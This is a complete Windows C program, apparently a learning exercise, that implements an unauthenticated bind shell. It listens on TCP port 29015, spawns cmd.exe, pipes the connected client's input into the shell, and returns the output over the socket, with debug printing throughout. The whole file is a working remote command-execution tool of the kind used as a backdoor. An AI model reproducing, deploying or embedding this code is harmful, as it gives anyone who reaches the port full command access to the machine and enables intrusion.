#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <tchar.h>
#include <strsafe.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define DEFAULT_BUFSIZE 4096
#define DEFAULT_PORT "29015"
#define EXIT_COMMAND "exit\n"
#define CMD_PATH "\\\\?\\C:\\Windows\\System32\\cmd.exe"

void CreateChildProcess();

DWORD WINAPI WriteToPipe(LPDWORD dummy);

DWORD WINAPI ReadFromPipe(LPDWORD dummy);

int ErrorExit(PTSTR lpszFunction);

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
HANDLE g_hSem_Rd = NULL;
HANDLE g_hSem_Wr = NULL;
SOCKET ListenSocket = INVALID_SOCKET;
SOCKET ClientSocket = INVALID_SOCKET;

int main(void) {
    WSADATA wsaData;
    int iResult;

    struct addrinfo hints;
    struct addrinfo* result = NULL;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        exit(1);
    }

    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }

    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        exit(1);
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, 1);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        exit(1);
    }

    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    closesocket(ListenSocket);

    SECURITY_ATTRIBUTES saAttr;

    printf("\n->Start of parent execution.\n");

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
        ErrorExit(TEXT("StdoutRd CreatePipe"));

    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
        ErrorExit(TEXT("Stdout SetHandleInformation"));

    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
        ErrorExit(TEXT("Stdin CreatePipe"));

    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
        ErrorExit(TEXT("Stdin SetHandleInformation"));

    CreateChildProcess();

    g_hSem_Wr = CreateSemaphore(NULL, 1, 1, NULL);
    if (g_hSem_Wr == NULL) {
        WSACleanup();
        ErrorExit("Semaphore creation error\n");
    }

    g_hSem_Rd = CreateSemaphore(NULL, 0, 1, NULL);
    if (g_hSem_Rd == NULL) {
        WSACleanup();
        ErrorExit("Semaphore creation error\n");
    }

    HANDLE threads[2];
    threads[0] = CreateThread(NULL, 0, WriteToPipe, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, ReadFromPipe, NULL, 0, NULL);
    WaitForMultipleObjects(2, threads, TRUE, INFINITE);
    CloseHandle(g_hSem_Wr);
    CloseHandle(g_hSem_Rd);
    for (int i = 0; i < 2; ++i) CloseHandle(threads[i]);

    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    if (!CloseHandle(g_hChildStd_IN_Wr))
        ErrorExit(TEXT("StdInWr CloseHandle\n"));

    closesocket(ClientSocket);
    WSACleanup();

    return 0;
}

void CreateChildProcess() {
    TCHAR szCmdline[] = TEXT(CMD_PATH);
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcess(NULL,
        szCmdline,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &siStartInfo,
        &piProcInfo);

    if (!bSuccess)
        ErrorExit(TEXT("CreateProcess"));
    else {
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
}

DWORD WINAPI WriteToPipe(LPDWORD dummy) {
    UNREFERENCED_PARAMETER(dummy);
    DWORD dwWritten = 0;
    BOOL bSuccess = FALSE;
    char recvbuf[DEFAULT_BUFSIZE];
    int iResult = 0;
    do {
        WaitForSingleObject(g_hSem_Wr, INFINITE);
        memset(recvbuf, 0, DEFAULT_BUFSIZE);
        iResult = recv(ClientSocket, recvbuf, DEFAULT_BUFSIZE, 0);
        if (iResult > 0) {
            printf("Bytes received: %d\n", iResult);
        }
        else if (iResult == 0)
            printf("Connection closing...\n");
        else {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
        }
        printf("\nrecvbuf: %s\nHandle: %p\n", recvbuf, g_hChildStd_IN_Wr);
        if (iResult > 0) {
            bSuccess = WriteFile(g_hChildStd_IN_Wr, recvbuf, strlen(recvbuf), &dwWritten, NULL);
            printf("bSuccess: %d\tdwRead: %lu\n", bSuccess, dwWritten);
            if (!bSuccess || dwWritten == 0) {
                printf("\nSomething went wrong in sending data to the pipe\n");
                ErrorExit("Problems with writing to the pipe\n");
            }
            else
                printf("\n->Contents of {\n%s} written to the child's STDIN pipe.\n", recvbuf);
        }
        else if (iResult < 0) {
            ErrorExit("Connection LOST!\n");
        }
        else {
            printf("End of connection.\n");
        }
        ReleaseSemaphore(g_hSem_Rd, 1, NULL);
    } while (strcmp(recvbuf, EXIT_COMMAND) != 0);
    printf("EXIT\n");
    return S_OK;
}

DWORD WINAPI ReadFromPipe(LPDWORD dummy) {
    UNREFERENCED_PARAMETER(dummy);
    DWORD dwRead;
    BOOL bSuccess = FALSE;
    char sendbuf[DEFAULT_BUFSIZE];
    int iResult = 0;

    do {
        WaitForSingleObject(g_hSem_Rd, INFINITE);
        Sleep(1000);
        memset(sendbuf, 0, DEFAULT_BUFSIZE);
        bSuccess = ReadFile(g_hChildStd_OUT_Rd, sendbuf, DEFAULT_BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0)
            printf("Something went wrong in reading data from the pipe");
        else
            printf("\n->Contents of {\n%s\n} Read from the child's STDOUT pipe.\n", sendbuf);

        iResult = send(ClientSocket, sendbuf, DEFAULT_BUFSIZE, 0);
        if (iResult == SOCKET_ERROR) {
            printf("send failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            exit(1);
        }
        printf("Bytes Sent: %d\n", iResult);
        ReleaseSemaphore(g_hSem_Wr, 1, NULL);
    } while (strcmp(sendbuf, EXIT_COMMAND) != 0);
    printf("EXIT\n");
    return S_OK;
}

int ErrorExit(PTSTR lpszFunction) {
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
        (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
    StringCchPrintf((LPTSTR)lpDisplayBuf,
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"),
        lpszFunction, dw, lpMsgBuf);
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(1);
    return 0;
}
